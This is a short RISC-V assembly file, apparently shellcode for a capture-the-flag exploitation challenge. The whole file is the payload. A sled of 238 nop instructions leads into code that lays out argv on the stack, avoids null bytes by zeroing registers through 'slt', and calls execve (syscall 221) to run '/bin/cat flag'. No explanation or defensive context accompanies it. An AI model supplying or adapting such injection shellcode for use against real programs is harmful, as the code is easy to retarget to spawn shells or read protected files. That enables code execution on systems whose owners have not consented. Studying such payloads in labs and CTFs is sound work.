    .global _start
    .text
_start:
    .fill 238, 4, 0x00000013    # nops

    lla s1, echo                # setup argv
    sd s1, -24(sp)
    lla s1, hi 
    sd s1, -16(sp)
    slt s1,zero,-1
    sd s1, -8(sp)

    lla a0, echo                # a0 = filename
    addi a1, sp, -24            # a1 = argv
    slt a2,zero,-1              # a2 = envp set to 0
    li a7, 221                  # execve = 221
    ecall                       # Do syscall

echo: .ascii "/bin/cat\0"
hi: .ascii "flag\0"
